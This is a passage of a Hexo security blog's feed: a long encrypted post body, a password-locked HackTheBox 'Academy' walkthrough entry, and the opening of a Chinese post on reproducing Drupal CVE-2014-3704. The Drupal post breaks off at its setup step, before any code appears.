6d53a29960cbb45dbdead920ecd642aa34ba403d2abdc41b6156fa12636b60d2cd6ec6049ad1ae411d0c14609c7577235e39103efca74461fad90460a149245313e490a389c60d6a9229cdff32e205f852009c7f767075b1a2a9b15eb05f1d439abb55db3f689a10de5257904faafbe21f3ce9c83e664f5be3277ec2597613fa9131a2e268d7f57c28191ce365934ec8e7906d1ac553fabbe5d1d5fd3fe0b7b36817cfef48525b7870d1e3b1496cb2b0b9b7bacd22faa6f5080d493cc27ec5952197d819910636e4e1d625f7a6121e39d850bdac09a627b730a6d403a997fb652b45695962576c47e2aaacf9f7bc1fc899f3ef1ffab970e0beab5d92af9dce26ccd83cd8a9ff4c25af935073c0ad7c4b6740db448c48c70db62aec4d69179dba6c4a7ad7f7c2570f823cd67b13cdfe1623c44c1755d3ecaa7f86f90c9ea0171930a602ccbba12711984e9b4bc337b04fb463ac9a711137f098173de565ca83be2539d00314349596b3542ed52333321e098ce0d3f61a8d856b94528343db996ab8e5d350366aba68a184dadd7bbd5698e0127d86304650abc21077efd1c5e582618be8c4b94818128c7916d2ff74ef8f05c5945b68146f142d055cb2580601f469acaf24fdfc6ef106eae3606c94e261da5271bded06d3fc049b739a6d3da6a0702a38d47ceb9280f0625817d6d4d00f4655895be9738fff44177a4c56b76a5422e74915fc41a513ba8954ed6ea21a05caed6edbbfa6edca09ea1e058fbc918a69486b7a4d7089fbe2e4a0b9da5286c32649afd739adf7fcc8576f1dd91bbb3a2118a3de09521497d77331c398db0b9ecf3c87beea84662d9610a1085d443c1edf4a3bdabdacb1ef411316cc25c4ae2de38701eb72abbc25ae0ad9881251d7fae9afa694ea59d0fbc15865b19b37c0fdaa592e5b8205a03c6f4b4904a8830980463c6a607f351d846fdcc0ee8e7a5af05f1889495068dd7777ee5c7f3ae54428a89027687cf8025ea23db805a76d5cb284517757f1820a586a77e8989a038b197ce7fdafe9e412e05186b342a554ccf1025474f5e5b15616fc07d14ca1c2ee8665e00fa9cc5f366940fc0a426461972181a76fe4a103d9882addc3d10a399364aede8c24ff4c617f4f7e1cfa22733e12911d55bff82c847d91336bfec2c421f017821b8151336ec95667dac9e3afe78a9be8e9ac38a2a56b517065ce1b4834759ab95c576a122fb7aba1a13e8906375d5cca0473178d53cc24f8d23f319a62c6e942d156d69f97ac4b2c0385ed4e9114fa2680389f35b7f4c7505e6c0c93c049e713905107a614d1e06793c36aa38030ff99eeb17cb18e2e7f253ad060fa3dfdef49f08580fdb679757b7622ed7b97e043b22eee4fca5f2d44c65a495e644374beca8543710c222a0efcc36df66934fce9899324df7233e5abe7b0ae15cd296708c704da0c8b3c97b01d8a23eccae091bb49abc65a8d046c7d554c6b4936ffdb0459d26131e2a7b3673e79387516e4245961133159a0a434b816be7cbea386da1849d7e921882d02cb9cab56a2b5da1504ac1e3723fe2a1de5dd73cad2225f307d207a2620d81ec7bc9b0305a1968477645641b800ed20b9396d6afada9fbaf741eacda75e05a1feb791d001b08ae8c0b64b8d0d9e3fbe2a60554dc04d9575ee6cc0cb8f3096cef55c78616843cad83536c07bc2f9c4d5108e78e20c58a37c3f6e1b383e7a8109b4476adc0f855c1fc457ba8d49b1007ec7b88552640ed43d50047c970e6a238aa37e00c03024601edcfd805f2c59622d05086fa0aeba5722686797b26251080a439b1ed3d9de602be88db6345ac2bbc0db5a42a615bb6cce2bd2ba6fe93ad635038bb600e430506756225b55e86401acc66af55a95e63b98416cf751acb37d545fe55d4199b9772c2b7d37ffd0d21c185f7f3d5973a6561a009f2ee9b03e06bef4d2d8a88d274b8f11aca73557781f329013d1020bcc653cb4411f462c96d0888642de57130c4d951f169a35c3df482744af94c4e1e621c13985e861f2c747f55e410163fa8d2ba27a196fdf5ede7a52585a15a896fc18b7299121055841cf9e8766d578c2b9d8adb07843abbfbc5aa60e9cdf6cfb7a5e404c24f65cae31dc594ef259bed3c04b72e3528b46f7f81bf3c7dd49f7b0fb28981551e1b2f5b7cf2304806adf0abb795deff9bc89483ecc087d3e665125380d1b3cea68203282d444623bbc3da58537c9688bcd73d393e3d567e21e4b629ffa2b1fce0be9181a7b42bf2ba8c7569bd86cea53db9f0bd783aa84053cb17812d5eeff21202bd5af64fbe954cb7e9367421592703494107663e9a33144b6d8776e8018f694fd8f8ba6bdfbdd6c7bb9d07b7b9392c60ce285c5fee59169e4e216026486ddd32a031020fc2453951575133a0d19e66bfba4eca90599ed5be49bd672796d01b7555cd8d8c90a2457fffab97881c09a477a77f4775989ce095b372a791225c7f769e80f53afe3b6e7997ea9827a5f7c227b9d65f6a86309f6d27706b29c47f70893a49543abac159903bdbaf0619bd9386fcfaffb120a8841028e7cc084acea965b7eea15f9572b12339a66cfc461526fac39eeaf30e232dcc762f813ce5cdb3c50d8c544e896ede4672a73cab783e14ed07718dd95c02863b1a539f43af7b3d563ac0f2d9a3ac5f70f2aed38df43786702de2be972c58d0b703869a8044cc956e4c3b759226d89eab98f6440cc958d8cec46acf56df430789184a960879c795e87750b0ae8eb023d1c325874f8b09cce821228a4cd1a4061015372a56d5d30ee42980b637c5a872a26ba252e10836a8e2da7e925b71eb5c8093703a6779d85e067d3ddac8b2bd725136b50f7fcf50c7250a9447bb385f447c16b41c07ec865fbe137351ce50127be7684f7f579880275059381c8fc5cd1b052e698d158435e532436fbb440a42c1f9fe1fbb5e7e0953320a09a90bec7f36804444134bd606cacc2578aa20a4498310873119f153a896ae653ae33d525d856bba917254084b6972b599ecd52fff78825cb8aac04d5d59c8c0059d09e4e5d8db784788e790db9e5323dbfd41a4e16b85559652eef1991a42f4da205582d510700367050c3e064ccecf145e38b4d5591c7ae8eb1239a07a8f4ede8db66ebabb0390d159e04ee10af78f8a9dd823903c0643c5c3fe93854f2b66127d6ef29b6b80078f7d17d1a6e4c5c2da14f134dc9e0bc94aa8ed4d1d9413b10dfebd05649819386cb466a2a36e34262a6c094b14badb3e382448be00120458651efdcf86ae47802a61600f0c2ec7b4c4efac90bc49731126fb91d8756de2e9b119949104cffe35152157e2a8bc2c3946452cbbaf56c60827570c21cc5ccd4110696e0d90f9ab23374400532f4c7850398163c09e44d046b9ffeab84c207181a83b167ff68ada16536b8b953655e0d3e019748f089ef7520bc692d346375749f766daacaa5520a64d1a85b449ed12c1f3d0b4c5eb8c36d46be0bbe350497210f7d74444bab08d018e1296732268859aa0fa3c1d1519d84bc537e0720491aa20900a484642376fc02c1c8459618e0d090aafe683f538422ac3b31caaeb9177aca2a268c575aa2b87d9f7d7e2bde435bd0c9fc2d3095ca4f111f04a4d4b9c6561bb8a7ea66123f38ce48082e65faac3380fbce72fbebe81be910e455e5fd572d8d9492c52508bad3a0473ac68859d6dfb5b6a5e6d1343ba329377170ce8221274875e6818cccf9ef8601e0fc89f15a9ea1402048eaa4d9da34193bf906d86368494ee7a01498b94a21c52e812cacb0fdae9d1aad49472fad33ad65b6ff14d7fa57746a2424a7a7590f9af719d9727367e9510ddd719e6818b61e3a3d19d5628946d15a25aff94a3ad9eac47942412d6da07e37cc6fdbf2eb3a4daa8131de301e2be2b3cb12aa384e8eb9cda96f3e0dbf869f7c5b2a4becd148f9794107d7c6783e3162034e43373bad6f85821306dd084de8a5af6de3ee176e529df3da9ab34e9c8c4f9b7909bae61d62ba887a3a7d70c588e64cec7aecfd2507e378fea8df783a884cb82f714b61b65dbc5e3fee44e15e5134f31de78360de3effd3d4602d8ddd7ad7c9cfe5981ee626d06515bdd77ac5ad047e6be48d0a58c51c228a9d0f2de8ca3e54e50bb1a1b13fe8464bcc664db4c11290f8a30ec12056db18ad4283e67fdc442740889bfe4732744922269dde8846005cd8edfa8e8cb2ccb9c9934276fa2ac212938839d1eacf1724ff3321c7a269c67ac162d9332cc14e13fa0b0bc5c7c9094a34ffc42873ed373d964726e4d1ab7f5f69a15775f9bd0eaac23a79cdff8775e5a22cab02984a619539e2d403268f3d666ab8c6f11769e85f2963992ac90de9ccf0d9a26f8f0826a677102dc04bcaefb03515cab2ed55965ad24aab364d1f2185317da838b22bd1dd5c413cbcb70acd7da4c4e4580730e0a29a832bf5126faf2e5d59710aec8cffa7c9fce1edcb4a248b80cc64cbeac5a39a1564f3951297c868a91ecd6445aa3a0a8cc48c1d4d4ae14006c59265cf6a91bb5e1a5921efdaf64e397c58efeba38144357adc8300a6c39a930064673773c65693aaaf2aaf12f6b166fc0557f5106223ee205176aff5fc791f239419ee0b33c2b9626798051db4a6c92a8d2236ef14918fb1c7972474b036ecbc2415aa47882ec6221c912fd9f56b1bc9ed5ae21eefa88f535bcd5d9165da9cc0673de7c109b4d946741270c68e2474d5b032e98c707f05a01638cf3850e450c7c97372f3fe0d9eff76ea6bbb0cf7c49adb4f92a0071fbc31cbbc3c70c3c97ec05fa0659b8ec543bf46026b5843733d84643067f3f8bf4eb3ee7487f6448080474eb7c69403314b9192389d697097f1926b90f7f63985c196ef14ce8550cb79e00aeb0eba43c1ccf6415a6f21056dbdf6278280be62f5e051f1118b19a656af396b455a576dfe6d786efd405175ac58582afa64969a8601db5a8726c1d1d95fe8c2d917008aa6269ffedbdb526cae84367ab9b85795521d60380d9d45b24ad2334c2939784ffa1ecdeeee2b154b0ef934c29c994fd9afe89baaa6e1ddc7525232aca871d85fd5ec80c93a11ae03eb20bc573bf1afddfb6765fdce7fd0cdd3e41b43ff446385494a66b79a8e1d441156502cb4b701a24e5a3f3f88138b58fe461f3d822089c29c22b9e3fe666612cdfc2fd4c943a210ccd5d0c00a65c38572f237d8411565a6804bb7f029248b27f0a3cce26f30307166c26af1f6266f8d0baa2a720ac141d0bcd0a415ef1269d294fca3f4df96c7d44c32c4dd93600ba62b30eaa8bc05e03731ddb8cea1c69a16c0d03db5dbaf13f63908af941027674fc10600bb148a8df815824d62722559fa97241c4d458075cae4dc522451ee5193817ec084dd7492ad339e2fdcac1f6db9eff091364a672a89a7ace2642048e68831e6c6147b58da64efdd353163b41fd420adf0a980b119382fc4f1a47be0fc7eed283aee7b2deb4efa0d4d5c5c11b22664e802fb2d116c0f4799c0243c5a401ed91f5a7cf13dac2571c3b89812846f47f0c596e665288614a2c68165a1f3a6c77c520ff5af49bf108bea94d63e691f1b68f72504a26e2d57eb667b3fbf398f61d92f08593b5f4767677716bfcd290f43e822b942b79a5a6c4b00611ebacfc6dc57c9235dafb9f4a1ddd291319ed8d45c0c6d49c4a81680a8a63d2604ad2b0802a8309288f0f9f85c39025832735105c79295da83b8b1e45c18ee2331f357fb5fba280ef09a376323cc9f683b74056396834873566b041b6b5f377fb4ce3e5f26f011e683c4126683d30caff53a3c97b922327020cc370cd15c289520b433071ec99379a3dd93c72fe2659fe82bfc4df59dc04e90fff7f35e14d4254227ab5f5432253f91a81298a35901a0b20a28e16aafa0fff7265c4e96b61e26e1d21b55f2dbdb9deddda300835aba22eaf6a68e492b7f27b66835b99f995fba5b868ab79747055c6215a986c22bd0218039e4f5eaf5bc22640f860e5a45a9330090540aa69f8d920312ba1f74fc64f522d0ca080f6a3397e3d4afd2106bd3b177d095836bfc19e9dd9b126863aeb8f9d40d89ea8c47368102f75f0bc39cd7a989033a82d6233d09b3c15467a461e27308bda9228efea5c005b05ec1643e68596ae94d906a7d287e8d9868f1bfe8f3e346f412d851808ea3c87f4e1bbf3b547c3c089d1f820012650b369b1b6472695463d0885f29cc0891e73e3f30dfaade1897ae2a099bfe006fe43cb68007fcf49b42b8187c7ea23aed9b373ada6303a89a21f9801466fa700dcea399888d405a30985984bee420e7eaebda6f063d4e030227ccc608f49edcd057fcaa8f69a683b5a6dd47b8a9ec528ac837a7eb2b5b54a288bbc72548d2ebb43b665afdc9098a04acd61f327678867796a36a221eb80e25594d310edc0c7eb768dfef561ee6acb471d70d362cdf5ebba13866ece9f8b2fc25d5ac3c0fbf0f82702b38d7a0118062bb9f961ac03cca4de0acc4b0a1fe6993580ff115ca2d5989d2a3835c1b80df9a3c43789e74a2c3e6bc8aa0846aa047f48844a25fcbb4d00c3dd0b18151056fceab19696e96faef966290fcb0b68a61f3f1a98b6f369f7a904725e3e9edbb8c9ad291cd59a356633e7f6376ad2a486f9fcefe60783aba2f400ee908f87700d37bc506303ecceaadec352d3d37a9c53c5c1c836ec1b4bc20b4b430a3c4bd5dcdc068711f6d5dc93aeecf9c6b151b3ed83005ce1827f5a07e99dcebcc801402b2b943ebacaf620bc7ccaa50a56c0605319aba4e07043eca4e50dfe1487d07f40f7c9c4733409b0cb9a415d8cc21e6466610855cfc4f4c4bb1ea24ba2094612ecad9a3f4a1c3e20e0383a1e5471dbb410f8cd08329561dcc4177d2eeeb3db4aaeb80f45c74af98a5a6818e641ec505cba711bdd8a76065625c6a0e786cfdf7f8f9af0fe0aca9fdf6db3ea219fb6e7d4293036a0798830539ced4d93361fd773a316347faa3715696e286c62515efe77f8e9cf0a5b9fd6892857bd0bd130eae3756140a44b5cb4ef512114f799f42c93ab87d72a0a587116bec9d940bb1b2a4087c8b550c7ae8b2496256d4fa0d11ecb7ec1288f4be669e4760160d9787c9d908b237bbd1ff4d226761ee39c421998d6ca240bd3344fa4dd06a2babaa09681bec4b115982d79f5c51678980513c295cceae9b4bebee4c382ad9242ead732e01cce6d99883612c94b1be0b0a67e43ce15d8376a78b7a26b4f11774b8ffd2c67dd0382dcb8c2eeb11e92918e92d8687e3446ae14c36bca7ad99f64e4fd1d44685bf572a39edc0c95e96c330f55bae42096daa9382f66295621b34e7a3e9fd7d5f6b7cfb0b54aa5bb33debb5b764ce654e6f806e07b76bfaf88556b055fd214c60ccf407ad9cd8252c36d11d4023e9142865a7a5ed5cd9963e3b3edfecdcbdb007ce56727578ef38645b5fae6dd0ffbeb3801a103fddcd48889d2b83c1a75d1cb90ad155d1f46f083fb416ab753ed34426bd3534f98fd00a55768f41605fd6ca6de15c4cd497a7cbae236c0b228b0e2ee96b737e386887f2b1faca1da6970a6c7ed71a2b68f1ae7f25aec722ff9a8f418024e6f7750c8be6f9c658919488dd15a672e3e60504876e81ccbc66b18536c5015b3d2cc52db3dd61c7c0534f77d568d469beb4ebc229c46e390a6759e47a937083ab8f8fbedd9efbfc05bdb5d4aa645111a4bb07982b88cf012171af94b82bc5e6308378dc81e44ac3b8f7b94b2ba22e904729d4479b0cd2a4cec0be43033c99a90cbd551e75252debb6e037f438ed8c625fde95d170f57b658241792a7a09550bcb921f951561f5a92ae4e2cf552a3bec0ffd9104c70b2dde16fb2441dcaffdcbe23fe64494a8b54536a44f05d92a67af319f500c75b5f34e653b125780eac22ea903b4fea7a8bd4ce2f2cd13365fe0df8a1b2b1dc0c21dfc576c1f6de4eefe051e043c5b2c6a316e2f93a00c71d7602b404aad11c197aad6810c501a1ff49d9d733b9624a1d73c7e2b9f5cc84af3c34dab19b18dc862b24311377677a89307e59260cb35a38428fc2d2fe7d735d60258fd7437f364cac9b19c2b1d62a28a7f57d44e66c9601b7221ba9a2c9f19b353b0b7cdefc682327481925a6d6fc337e06a80576267bec1d43a86eb003008613735e5cbd929eae5b80ee925f5c750dcd8b024e3289f0ad43b7e3b775385b6448adf97bba1f028c7bed184db389104c84fb5c46025f3e8265d783876305fbb8692931ff77fa9e9a2f7cdd3d74d38521c36a26c07e4dce71c25b97f4cdc533800dfb0394603c48872c7fbcd70c9a947f0de2f102d120e8066036f5a869863a8be12652a69109b6b80f00116756723a41469a8d0f642ec7088ce925d7ad1af0bbf104cc94a715a30cfa9cfacb9241647a21807acdaaea8a60db48cb2dacf329737b7b33093ad8840d5436f6b8bfc736597b131d7254885752bea5103c456a01450c0fff6553d3d908ca1841e5965f09eade5bd3f1cc04c12bd49094e60ea4567dfd15ce6053838c10dfeab8401098b858d544e8ee760d4c4b4f5ff1712ebf187f0ece616dfde205781f0be30d730ff12424e9b9150bf1b43fadbbbe8d9b92fb02ff40fa42aad26a1b18d79f1d655205d75dac05e152b79f5ffa0316578889c31a459713aa5780c300cd9ac59a17acaff43db7158ccf648a1780afce6112f56f128687e2286843de5d2109e491024e10f56ad1a8f3a6f5d970927c2b92cc98803c4494f850f37739740ae44ddae65b527699831cb189b22e3dd7c956978142b1bbf18d06a9f640349ed2efae4be1adb60f237d77f8a602708fe6d103b7ddd11a0a3fd17a97787cbab393bb3c3686f86c41ec1115193f1141bb8766d63c37d6e20af83fe38fec0062266b9f867336f6d4f7a6ca3d50de4fc37eae2196dbd45fa9329db7706d372e932d07e811dfbe78a08d88c1801777d5f70d5f59c48183464f4109e97c428d9b642775e3441053af6246433aabd661880537016f86aac1b4e44446ccc3e0777c9337d107d88297b812ed347bc2ae9c72bc45130563dc16710ec6f2d4d9f6644576d7769868a19119300b1a44e2a33c3b8b31cc5fe93d4f799296b3053dc6b55b28d2a0a2f17be9be0b7cc0fda3f67dd619e257a75cc258e9e7d8aa86eead90d4de07f2cb48e9c5471d0e7249cfef934ea48ece1847c2d8ab810b1a92f8c32a90564b88a899847f0828ac12f9960235fedd1f4a0f3c54cec8ab1266636a76838e96f96e39101e93d3310456c352b7e7ad3a8e4913df8fe45e3a0880b0592a51690ea09ba15dd83bb1230e0cd1cf1a5c8c8babdd300faf114d1fbd9d900bb85e12366fc1c88dc72e1356563b1f2f2355d763af419d5a9a18802001941c10984376bfc6a6898def7302e3772d3e867714bc8f5062a8117086c02727eb94d4d098bba57343ff74ed3f929194cfd63ee84d234fa1d452e88703c8e9dcb5b430f21dab054bb7771d3b7b6174aff1dffc3ff47ecbbdb9097da784080054205faba37caa9e5b41f1abf96a06a53a9ad3c1432ef2fb17fd76e4b9ee01da2922867e8771d22cc5009026137dd5e3d1076e276a4c93b6b89323545f7d1a788d977d024368d8944bd502b4093ac13a14ad22c459fe171345dedfd92efe62b1ad228105694d5c447aa0d37529e809c0065484dd9819b5ec451b2dc2e8f0112aec70cd08b1546749a33876ecb67735a1c91d2d5ab880fa7ffcf6d12ec434cd937190e749c30922ac8e06676c9bc2cadc9aa96593c71c81f390163341795e20e97fd92893ccf9de99b59fc9ea4f6eef4109d9e6a1470ab9412ffd192c774d780d65bf5ff72b84c1098888175d1f28a88d374766a2f6191adec75d7a2e4b767bc286348e1788525ee46fdef8f99a5d229e70f5c45ab365c63fc17d66e727c1d7ccf8db396cdb95f1a1fb393c3f9c6573ebe5349b53912abadfbe8932ec8528fdaa8406e1098589b1dc3fcd8b84d1e20fc2f3c06aa21a1eadbaeb9b25842db50650c72b3469ad377528cb3aee25bed755437401ee3c59a757431bea10751fbba758851c49e71d1f038a07f1ea5822d2062e4327ae870b9153a390e0cc373641104ea5958e292fd8f4cad4eb02e9d15e3d2d9ab90ca2ef61dd47bd1733179ad22bd2a9a8cd6be1258e05bc16c28dc8e965f41003f7a45c4ba1862b69a114445427a89952c5b4beafc6ea67f05400630a4e4fa00982735532479dc4754c0b09ab35a21894c35555cea29cba7b3c689888df2839a231d21e9680bdcd4180bce7b0c25415066618b38b14fa8a76a783284fc0f2150045e02ee5876552e6b3c30ea4980b507a9098f6fe27f6bc1d985c2e86524d0e7c3f0962e57cf0aa0124f7cbca46ac4e2f770900bc048e25d93d25e27d055920e7c1fbcd416d5dff5dcb1c798497aebc7a1fd52c0d540f14845943c3413ba5e845e874b05af07468060e90a69448bfd38d3f5a5e50902b0b80154e98f3b6f25689493c8ad3a69d7332a504879d001c0a53026a8e35d055821d877da068fc79e0cc137a84e77165f1d92322a5ec5e2bcd947f0c0955cc03f8398c3c2c2cec2dabcbb0357905670ab952143e8cc7eaf860ea81dfc8c695a2b271460479916cc1575b3a6e29cb8aff7ca67047bcf121a93099cfea10c1c28a7c6cb51ebb197b76969c468cc4424007baccb97e0ee9bc4287e7cbcf186f93ccb3ce17e9d362e7c9db75ab1fcede609812c231a953c06ccf505a4b614cd75a1d3c70656dced1914e468a52c8d31e4eac349c6153e32456478041cb23525e1c6ba1df2687339ff454b65b7097ccbda4d6b3aa7570cc76bdd7c26d1e6d27fffa2b6f68ec03ea3cd73d6c837114189068865a8712f7abe5ce39d21db5993d8efb4745cc4f90274b0ee2a5449c5a86332946549901b5c79577ae4081e177947302814b56949b90a8aaa78be1c0bd0c2c0cbeb1ddaffacaca96615d32a1a33da7f82c7d850336d0bfb012d4e924e63f6e0f6c788c55c65d10e02d32ca52d9a7e83e480a15d97b062712ded15958e476566cbd78adcc32929564ae2b9cafb469283c8fe6320b4b780d0229f138dda7255d2f89fb13ac412f2c1d52399320bde8d115e7af44ea5baf94b9d7f4af2bba4896f41e2ba6cfef7352755150bc7d29445ded1de9395826ed69b7162728f842fcb56b32ef6ca14f6fc74981aed85f32823416e8e45f87ca272dbbc182db2198640cdbd25e0e7a1a8f4644faa414618b57416900365b705750e369e2cab1a83c4e86989bfaf387649a9fba642488c642bb7388545d1b32d03c58ee240bf557ab90f6113ee1551cf35b953661568590c1e97820f170c20a7cb3dee6714c1daeff14909b6804f75d8865b930da44d88446466589e7be1556cd54dd29e091993c23de996b5f297a0f41878d2c65cef18667b5139a6019e963f2e82546816927f950a3c5c1eecce9c2e0c3df2af2986b57c655b9e977f846a9d35220a5ba0b526ecd29d495e9e03c6b3d48e4ffa3714816dc86a7739b21c64a9b0c0bcb96ac807da6cadceea36325580a1a897de15de1b0f5195d7507980e19c1a54eafda80423122e84b28762f18031fc78a6155a4cdc32b7593a465ad17884244e9070d97f1f14c971fb4c4022439ae2396ed9055b424b981e1f4a2e1de2149f6c5692b2f6f6020bdd5076151b691855ddfd8024b63d386954e8a519cf2c49e8584abf080685da6bcb08eb5fb0458a4ed9c0db9e90479e4780e41ca28a5f9d1a03ca984831d55d8bef21464d66445d0f693c462cf4c455f36d0435fce2b1eb238395f23bc746d6a20d7513de347b4ff2f005fa935f08df57a9b78e7e0d3a0f78dc84318965a44bc391d2f2d7dc9fba0ce40a28f122d34dbd38a93ce1fe17e985b4c6b790672d4b1300cc4b29f15d71d53216c490fe8f17c042618ddfda7aeba4cd5811f27e7349ef9931274336bdf56f63abfb985e54bc336c8ca5384b6c4a7bbf45daf6d0c049c72012fb3041293a68ea2c7f7d4cd5fbdf62ce629debd6ff7892e692ad778e55ceb63363de54f9c1a6a286fb6c04401d8f644a3ed19d1a5d18f54417b7bfb10d2a74ea208cc56e7b58232b4b9d53d278b5d592c0e0a702236ced5d9d84427cdf48d986bcbc9a6d8ea4eeaf742267e0153768dd65c9ca59116722ab544061594fb8e5d8ae7879ad9e6985ac30601d7892e0169fa3709671c148b3c4176442a09d6c1b702b7745b1c37048a2761aab73d2e7492958373fbf1b2becd517ea02521b80d0c2024a1ec81a7a8045c4309a6a786ad38482ef4065695351bead8bc8505d45ef57424a3178c4deabcc2677d586c917788eea72debc2773969dd4fa3561a7af1b036a50b5fff6177d511f8adeb88f3301fc5ad5d95f7836a0ed7e7cd6a75fe6ae688f90274510dcc15fe44d48bf6925dad592e2b139af40ee9f920f88eae73b3538c955c5a9bd186f9674c061828dd04981d6744d7d02b56edf802c275e1fb03e2fd9b5a8f510bf2e76f0c330eaddfc4d3d49fe4561eb70eac08042cc272c9c825c50a2a9a02839a98b79b5fa94d9da65b5acb758c1c8a53539418f6838ac6f6f17d28d5120343bbbc9f4cf159f93b20ebb1aa0696a9157c6591ccdd23284990b10d62d62ebe53c128fe1d2c40345be1981a1a2f511273dd6380daa50b811814dc7ad31857b38af8a34a3b81ad272033bb86d606e3750d8c44ae801da61e0072fa86108e2952f1d51a011e5aaec458823ee96ed0d357b09d0de2a13a808efe66bbce22f2a4efd16a5b2b0e35f6fd494aec668d9465bddae06783fa2353ea11ab535073be7b184d1f5f7da347b2ed7f0506f50fd9051533db5bf14383559c544a8b5423ff145e344198076f2fe8a9535cb93eaac7f33e21af7033762fc494ba03ad6017bc1622cab8c7c75dc51acfa74afd3fbf967212b62f76b18ec58bd9b0bec45ffa4e2a44b7e22ec8dadb8794593973e8d146826997f6068e1b68dda628d7a3f220bce75485c9a6cdfc22d3f97eda93e7caa44bf7567bbcfb376e50c22d2ef7fcb9262d5528b9b4b9b1376e01d8acb32ab90903852d06938f97b3b91ff9bcf57f2ced16f80bc53790b72f24611fa7fc3b2368dc9786dbf6f63ca8da426c43f058e05236c043af90ec91b77944314e63c739ab0159825e11b3fb161e31fb35c7a98db0612fa04a8c43ae4028b2ccf1338249c193815fbdcc529f966788220a38d516a413f762903202c4aea64bd829c66b9fb4f0929814545717c3f4354da28b48eb0ed0b103196bf220aa75321df68d8ba2cfadfa94ccc283e834e48406dfac64ed76deffc4fc5409f7e6700aaa53434630c7b7dd82b17f63d874e803f62c128b374c7c594758db1eec4bcbcee3e311cae07739a28874f7d616a5798babe09d488b117e9697596d5c7269242c05406bf6c85652c2ab7afc4dc77fe05277b1b93795e22aa120</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">Hey, password is required here.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="靶机" scheme="http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"/>
    
      <category term="HTB" scheme="http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"/>
    
    
      <category term="靶机" scheme="http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Academy-Walkthrough</title>
    <link href="http://ca0y1h.top/Target_drone/HackTheBox/22.HackTheBox-Academy-Walkthrough/"/>
    <id>http://ca0y1h.top/Target_drone/HackTheBox/22.HackTheBox-Academy-Walkthrough/</id>
    <published>2021-01-24T13:44:57.000Z</published>
    <updated>2021-02-05T10:34:08.845Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="fff9a5e0d9ca6fa774a982315d2eba5262fc3915dd4196909cc507a2504a369f"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">Hey, password is required here.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="靶机" scheme="http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"/>
    
      <category term="HTB" scheme="http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"/>
    
    
      <category term="靶机" scheme="http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>Drupal历史漏洞分析复现</title>
    <link href="http://ca0y1h.top/code_audit/PHP/16.Drupal%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/"/>
    <id>http://ca0y1h.top/code_audit/PHP/16.Drupal%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-01-22T13:35:34.000Z</published>
    <updated>2021-01-22T13:38:44.185Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Durpal历史漏洞复现记录">Durpal历史漏洞复现记录</h1><p>在具体分析Drupal的历史漏洞之前，可能需要先大致了解一下Durpal的整个工作流程，这里推荐三篇文章：</p><p><a href="https://blog.csdn.net/u011474028/article/details/53021051">https://blog.csdn.net/u011474028/article/details/53021051</a></p><p><a href="https://blog.fleeto.us/post/drupal-from-request-to-response/">https://blog.fleeto.us/post/drupal-from-request-to-response/</a></p><p><a href="http://blog.topsec.com.cn/%e5%85%b3%e4%ba%8edrupal8%e7%b3%bb%e5%88%97%e6%a1%86%e6%9e%b6%e5%92%8c%e6%bc%8f%e6%b4%9e%e5%8a%a8%e6%80%81%e8%b0%83%e8%af%95%e6%b7%b1%e5%85%a5%e5%88%86%e6%9e%90/">http://blog.topsec.com.cn/关于drupal8系列框架和漏洞动态调试深入分析/</a></p><h2 id="CVE-2014-3704-SQL注入漏洞">CVE-2014-3704 SQL注入漏洞</h2><h3 id="影响版本">影响版本</h3><p>Drupal &lt; 7.32</p><h3 id="环境安装">环境安装</h3><p>从官网中下载Drupal 7.31版本的源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 